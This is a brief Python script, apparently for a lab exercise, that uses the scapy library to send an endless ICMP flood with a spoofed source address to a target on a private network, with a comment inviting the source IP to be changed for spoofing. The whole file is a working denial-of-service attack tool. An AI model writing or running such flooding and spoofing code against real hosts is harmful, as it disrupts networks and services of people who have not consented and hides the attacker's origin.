

# TO TEST ON THE NODE


from scapy.all import *

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"

def icmp_flood(SOURCE_IP = "10.1.5.3"):
    print("Sending packets...")
    ip = IP(src=SOURCE_IP, dst=TARGET_IP)
    send(ip/ICMP(), loop=1, verbose=0)